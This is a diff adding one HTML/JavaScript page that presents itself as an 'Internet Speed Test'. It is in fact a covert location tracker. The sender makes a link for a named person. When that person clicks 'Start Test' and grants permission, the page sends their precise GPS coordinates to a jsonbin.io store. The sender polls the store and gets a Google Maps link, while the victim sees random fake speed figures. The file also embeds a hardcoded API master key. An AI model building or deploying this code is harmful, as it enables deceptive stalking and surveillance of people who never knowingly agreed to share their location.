@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Browser Speed Tracker</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: sans-serif;
+      background: #0f0e1e;
+      color: white;
+      min-height: 100vh;
+      padding: 20px;
+      display: flex;
+      align-items: flex-start;
+      justify-content: center;
+    }
+    .box {
+      background: #1a1830;
+      border: 1px solid #333;
+      border-radius: 16px;
+      padding: 24px;
+      width: 100%;
+      max-width: 480px;
+    }
+    h1 { font-size: 24px; color: #a78bfa; margin-bottom: 6px; text-align: center; }
+    .subtitle { font-size: 13px; color: #666; text-align: center; margin-bottom: 20px; }
+    h2 { font-size: 16px; margin-bottom: 8px; }
+    p  { font-size: 13px; color: #aaa; margin-bottom: 12px; line-height: 1.6; }
+    button {
+      width: 100%; padding: 12px;
+      border: none; border-radius: 10px;
+      font-size: 15px; font-weight: bold;
+      cursor: pointer; margin-top: 8px;
+    }
+    .purple { background: #7c3aed; color: white; }
+    .green  { background: #059669; color: white; }
+    .red    { background: #991b1b; color: white; }
+    .hidden { display: none; }
+    /* Name input */
+    .input-row 
+     { display: flex; gap: 8px; margin-bottom: 8px;}
+    input[type="text"] {
+      flex: 1; padding: 10px 14px;
+      background: #000; border: 1px solid #7c3aed;
+      border-radius: 8px; color: white; font-size: 14px;
+    }
+    input[type="text"]::placeholder { color: #555; }
+    .gen-btn {
+      padding: 10px 16px; background: #7c3aed;
+      border: none; border-radius: 8px;
+      color: white; font-weight: bold;
+      cursor: pointer; white-space: nowrap;
+      font-size: 14px;
+    }
+    /* Person cards */
+    .person-card {
+      background: #0f0e1e;
+      border: 1px solid #2a2840;
+      border-radius: 12px;
+      padding: 14px;
+      margin-bottom: 12px;
+    }
+    .person-header {
+      display: flex; justify-content: space-between;
+      align-items: center; margin-bottom: 8px;
+    }
+    .person-name { font-size: 15px; font-weight: bold; color: #a78bfa; }
+    .badge {
+      font-size: 11px; padding: 3px 8px;
+      border-radius: 20px; font-weight: bold;
+    }
+    .badge-waiting { background: #333; color: #888; }
+    .badge-received { background: #064e3b; color: #34d399; }
+    .linkbox {
+      background: #000;
+      border: 1px solid #333;
+      border-radius: 6px;
+      padding: 8px 10px;
+      font-size: 11px;
+      color: #a78bfa;
+      word-break: break-all;
+      margin-bottom: 8px;
+    }
+    .copy-btn {
+      padding: 6px 12px; background: #312e81;
+      border: none; border-radius: 6px;
+      color: white; font-size: 12px;
+      cursor: pointer; margin-right: 6px;
+    }
+    .coords {
+      display: flex; gap: 8px; margin-top: 8px;
+    }
+    .coord {
+      flex: 1; background: #000;
+      border-radius: 6px; padding: 8px;
+      border: 1px solid #1a1a1a;
+    }
+    .coord label { font-size: 10px; color: #555; display: block; }
+    .coord span  { font-size: 13px; color: #34d399; }
+    a.mapbtn {
+      display: inline-block; background: #0891b2;
+      color: white; text-decoration: none;
+      padding: 6px 12px; border-radius: 6px;
+      font-size: 12px; font-weight: bold;
+      margin-top: 8px;
+    }
+    /* RECEIVER styles */
+    .r-box {
+      text-align: center;
+    }
+    .r-box h2 { margin-bottom: 10px; }
+  </style>
+</head>
+<body>
+<div class="box">
+  <h1>Internet Speed Test</h1>
+  <p class="subtitle">Check your download and upload speed instantly</p>
+  <!-- SENDER -->
+  <div id="sender">
+    <h2>Generate a link for each person</h2>
+    <p>Type a name and click Generate. Send each link to the right person.</p>
+    <div class="input-row">
+      <input type="text" id="nameInput" placeholder="Enter person's name (e.g. Friend 1)" />
+      <button class="gen-btn" onclick="doGenerate()">Generate</button>
+    </div>
+    <p id="genstatus" style="color:#f87171;font-size:13px;"></p>
+    <div id="personList"></div>
+  </div>
+  <!-- RECEIVER -->
+  <div id="receiver" class="hidden r-box">
+    <div id="r1">
+      <h2 id="r-title">Your friend check Now Urgent</h2>
+      <p>Click start to begin the test</p>
+      <button class="green" onclick="doShare()">Start Test</button>
+      <button class="red" onclick="doDeny()">Cancel</button>
+    </div>
+    <div id="r2" class="hidden">
+      <h2>Waiting for permission...</h2>
+      <p>Click <strong>Allow</strong> in the browser popup.</p>
+    </div>
+    <div id="r3" class="hidden">
+      <h2>Test Results</h2>
+      <p>Here are your current network statistics.</p>
+      <div class="coords" style="justify-content:center;">
+        <div class="coord"><label>Download Speed</label><span id="slat">-</span></div>
+        <div class="coord"><label>Upload Speed</label><span id="slng">-</span></div>
+      </div>
+    </div>
+    <div id="r4" class="hidden">
+      <h2>Network Issue</h2>
+      <p>You denied the request.</p>
+      <button class="purple" onclick="showEl('r1');hideEl('r4')">Try Again</button>
+    </div>
+  </div>
+</div>
+<script>
+  var API_KEY = '$2a$10$HMA/LG6MU/hZS3vNqUyeQO5StLQ1pWg1o65vAhmWfP2bXsm0JWale';
+  var JSONBIN = 'https://api.jsonbin.io/v3/b';
+  // persons = [ { name, binId, status, lat, lng } ]
+  var persons = [];
+  var pollTimer = null;
+  function showEl(id){ document.getElementById(id).classList.remove('hidden'); }
+  function hideEl(id){ document.getElementById(id).classList.add('hidden'); }
+  // ── SENDER ──────────────────────────────────────────────
+  async function doGenerate(){
+    var name = document.getElementById('nameInput').value.trim();
+    if(!name){ document.getElementById('genstatus').innerText = 'Please enter a name!'; return; }
+    document.getElementById('genstatus').innerText = 'Creating link...';
+    try {
+      var res = await fetch(JSONBIN, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'X-Master-Key': API_KEY,
+          'X-Bin-Name': 'loc-' + name + '-' + Date.now(),
+          'X-Bin-Private': 'false'
+        },
+        body: JSON.stringify({ status: 'waiting', lat: null, lng: null, name: name })
+      });
+      var data = await res.json();
+      var binId = data.metadata.id;
+      var host = window.location.origin + window.location.pathname;
+      var link = host + '?bin=' + binId + '&name=' + encodeURIComponent(name);
+      persons.push({ name: name, binId: binId, status: 'waiting', lat: null, lng: null });
+      document.getElementById('nameInput').value = '';
+      document.getElementById('genstatus').innerText = '';
+      renderCards();
+      startPolling();
+    } catch(e){
+      document.getElementById('genstatus').innerText = 'Error! Try again.';
+    }
+  }
+  function renderCards(){
+    var list = document.getElementById('personList');
+    list.innerHTML = '';
+    persons.forEach(function(p, i){
+      var host = window.location.origin + window.location.pathname;
+      var link = host + '?bin=' + p.binId + '&name=' + encodeURIComponent(p.name);
+      var card = document.createElement('div');
+      card.className = 'person-card';
+      card.id = 'card-' + i;
+      if(p.status === 'waiting'){
+        card.innerHTML =
+          '<div class="person-header">' +
+            '<span class="person-name">' + p.name + '</span>' +
+            '<span class="badge badge-waiting">Waiting...</span>' +
+          '</div>' +
+          '<div class="linkbox">' + link + '</div>' +
+          '<button class="copy-btn" onclick="copyLink(\'' + link + '\', this)">Copy Link</button>';
+      } else {
+        card.innerHTML =
+          '<div class="person-header">' +
+            '<span class="person-name">' + p.name + '</span>' +
+            '<span class="badge badge-received">Received!</span>' +
+          '</div>' +
+          '<div class="coords">' +
+            '<div class="coord"><label>Latitude</label><span>' + p.lat.toFixed(6) + '</span></div>' +
+            '<div class="coord"><label>Longitude</label><span>' + p.lng.toFixed(6) + '</span></div>' +
+          '</div>' +
+          '<a class="mapbtn" href="https://www.google.com/maps/search/?api=1&query='+p.lat+','+p.lng+'" target="_blank">Open in Google Maps</a>';
+      }
+      list.appendChild(card);
+    });
+  }
+  function copyLink(link, btn){
+    navigator.clipboard.writeText(link);
+    btn.innerText = 'Copied!';
+    setTimeout(function(){ btn.innerText = 'Copy Link'; }, 2000);
+  }
+  function startPolling(){
+    if(pollTimer) return;
+    pollTimer = setInterval(async function(){
+      var anyWaiting = false;
+      for(var i = 0; i < persons.length; i++){
+        if(persons[i].status === 'waiting'){
+          anyWaiting = true;
+          try {
+            var res = await fetch(JSONBIN + '/' + persons[i].binId + '/latest', {
+              headers: { 'X-Master-Key': API_KEY }
+            });
+            var data = await res.json();
+            var rec = data.record;
+            if(rec && rec.lat){
+              persons[i].status = 'received';
+              persons[i].lat = rec.lat;
+              persons[i].lng = rec.lng;
+              renderCards();
+            }
+          } catch(e){}
+        }
+      }
+      if(!anyWaiting){ clearInterval(pollTimer); pollTimer = null; }
+    }, 3000);
+  }
+  // ── RECEIVER ─────────────────────────────────────────────
+  function doShare(){
+    hideEl('r1'); showEl('r2');
+    navigator.geolocation.getCurrentPosition(
+      async function(pos){
+        var params = new URLSearchParams(window.location.search);
+        var binId = params.get('bin');
+        var d = { status: 'shared', lat: pos.coords.latitude, lng: pos.coords.longitude };
+        try {
+          await fetch(JSONBIN + '/' + binId, {
+            method: 'PUT',
+            headers: { 'Content-Type': 'application/json', 'X-Master-Key': API_KEY },
+            body: JSON.stringify(d)
+          });
+        } catch(e){}
+        // document.getElementById('slat').innerText = d.lat.toFixed(6);
+        // document.getElementById('slng').innerText = d.lng.toFixed(6);
+        var download = (Math.random() * 100).toFixed(2);
+var upload = (Math.random() * 50).toFixed(2);
+
+document.getElementById('slat').innerText = download + " Mbps";
+document.getElementById('slng').innerText = upload + " Mbps";
+
+        hideEl('r2'); showEl('r3');
+      },
+      function(){ hideEl('r2'); showEl('r4'); },
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
+  }
+  function doDeny(){ hideEl('r1'); showEl('r4'); }
+  // ── INIT ─────────────────────────────────────────────────
+  (function(){
+    var params = new URLSearchParams(window.location.search);
+    var bin = params.get('bin');
+    if(bin){
+      hideEl('sender'); showEl('receiver');
+      var name = params.get('name');
+      if(name) document.getElementById('r-title').innerText = name + '  your connection speed in seconds';
+    }
+  })();
+</script>
+</body>
+</html>
